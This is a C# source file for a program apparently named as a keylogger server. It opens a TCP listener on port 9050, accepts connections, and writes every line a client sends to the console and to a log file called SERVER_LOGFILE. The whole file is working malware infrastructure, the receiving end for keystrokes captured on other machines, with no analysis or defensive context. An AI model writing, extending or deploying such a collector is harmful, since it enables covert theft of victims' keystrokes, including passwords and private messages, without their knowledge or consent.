using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Keylogger_Server
{
    internal class Program
    {
        static void Main(string[] args)
        {
            IPEndPoint ipep = new IPEndPoint(IPAddress.Any, 9050);
            Socket newsock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp); ;
            newsock.Bind(ipep);
            newsock.Listen(10);

            while (true)
            {

                Console.WriteLine("Waiting for a client...");
                Socket client = newsock.Accept();

                IPEndPoint newclient = (IPEndPoint)client.RemoteEndPoint;
                Console.WriteLine("Connected with {0} at port {1}",
                                newclient.Address, newclient.Port);

                NetworkStream ns = new NetworkStream(client);
                StreamReader sr = new StreamReader(ns);
                FileStream fileStream = new FileStream("SERVER_LOGFILE", FileMode.Append, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fileStream);
                sw.AutoFlush = true;
                StringBuilder stringBuffer = new StringBuilder();
                int lastLoggedLength = 0;

                while (true)
                {

                    try
                    {
                        string line = sr.ReadLine();

                        if (line == null)
                        {
                            break;
                        }
                        stringBuffer.Append(line);

                        string newChars = stringBuffer.ToString().Substring(lastLoggedLength);
                        Console.Write(newChars);
                        sw.Write(newChars);
                        sw.Flush();

                        lastLoggedLength = stringBuffer.Length; 

                    }
                    catch (IOException)
                    {
                        break;
                    }
                }

                
                Console.WriteLine("\nClient disconnected. Waiting for reconnection...");

                sr.Close();
                sw.Close(); 
                ns.Close();
                client.Close();

            }
        }
    }
}
